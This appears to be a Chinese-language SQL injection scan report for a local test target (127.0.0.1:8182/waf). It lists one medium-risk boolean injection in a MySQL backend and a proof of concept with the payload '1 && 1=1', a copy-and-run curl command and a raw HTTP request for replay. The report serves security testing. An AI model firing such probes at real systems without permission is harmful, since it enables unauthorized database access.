...
- 扫描ID：`oVmB5fg5j6iW`
- 目标：`http://127.0.0.1:8182/waf?id=1`
- 风险等级：**Medium**
- 数据库：MySQL
- 注入点：1 · 漏洞：1
...
- 本次已检出 **1** 条漏洞（详见下方清单）；verdict 仅用于描述「未检出」类阴性结论的可信度，不适用于本次结果。
> 本次扫描检出 1 条漏洞；verdict 仅描述「未检出」类阴性结论的可信度，命中详情见 vulns
...
### PoC-1 · 注入点 283e732d · boolean

- 请求：`GET http://127.0.0.1:8182/waf?id=1+%26%26+1%3D1`
- Payload：`1 && 1=1`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-11T18:28:27.313Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8182/waf?id=1+%26%26+1%3D1'
```

原始报文（存为 `poc-1-283e732d.txt` 后可用 -r 导入复现）：

```http
GET /waf?id=1+%26%26+1%3D1 HTTP/1.1
Host: 127.0.0.1:8182
